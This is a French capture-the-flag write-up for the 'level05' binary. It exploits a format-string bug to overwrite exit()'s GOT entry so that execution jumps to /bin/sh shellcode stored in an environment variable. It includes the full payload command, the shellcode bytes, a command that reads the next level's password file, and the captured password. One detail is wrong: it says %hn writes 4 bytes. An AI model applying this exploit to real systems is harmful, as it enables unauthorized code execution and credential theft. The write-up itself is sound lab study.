# level05

On va vouloir réecrire l'adresse d'`exit` dans le GOT:

<details>

<summary>Objdump of ./level05</summary>

```
$ objdump -R ./level05

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```
</details>

=> `exit()` address in GOT: `080497e0`

Cependant, notre input est mis en minuscule, cela peut affecter notre shellcode. \
On va passer notre shellcode par une variable d'environnement, \
Pour obtenir une adresse fiable (non affectée par gdb), on fait un main.c qu'on lance avec `env -i` :
```c
#include <stdlib.h>

int main(void) {
  printf("%p\n",getenv("payload"));
  // 0xffffdfb7
}
```

Ensuite, grâce à notre input mis dans `printf()` on va écrire l'adresse GOT \
Cependant l'adresse de notre variable d'env est tellement haute qu'on ne peut pas juste passer par `%...x` comme avant \
On va passer par `%hn`, cela nous permet d'écrire par batch de 4 octets, cela diminue considérablement le nombre de char à imprimer : \
Pour notre adresse `0xffffdfb7`, on va écrire `0xdfb7` chars, puis `0xffff` chars
```py
>>> 0xffffdfb7
4294959031
>>> 0xdfb7 - 8
57263
>>> 0xffff - 0xdfb7
8264
```

Ainsi notre payload est:
```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57263x" + "%10$hn" + "%8264x" + "%11$hn"'; cat) | env -i payload=$(python -c "print '\x90' * 32 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'") ./level05
```

Avec le shell donné évidemment ...
```bash
cat /home/users/level06/.pass
# h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
